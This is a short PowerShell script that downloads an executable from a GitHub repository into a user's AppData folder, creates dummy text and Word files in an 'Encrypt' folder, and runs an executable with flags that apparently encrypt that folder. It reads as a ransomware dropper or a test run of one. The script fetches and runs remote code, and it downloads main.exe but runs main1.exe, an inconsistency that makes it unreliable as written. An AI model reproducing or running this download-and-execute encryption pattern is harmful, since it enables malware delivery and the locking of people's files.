$localpath = 'C:\Users\VD` Winx64\AppData\Local'
$WebClient = New-Object System.Net.WebClient
Start-Sleep -s 5
$WebClient.DownloadFile("https://github.com/ashakiro/test1/raw/main/main.exe","$localpath\main.exe")
Start-Sleep -s 5

New-Item -Path "C:\Users\VD Winx64\AppData\Local\Encrypt\PStxt.txt"
New-Item -Path "C:\Users\VD Winx64\AppData\Local\Encrypt\PSdoc.doc"
Start-Sleep -s 5
powershell "$localpath\main1.exe" -p $localpath\Encrypt -e
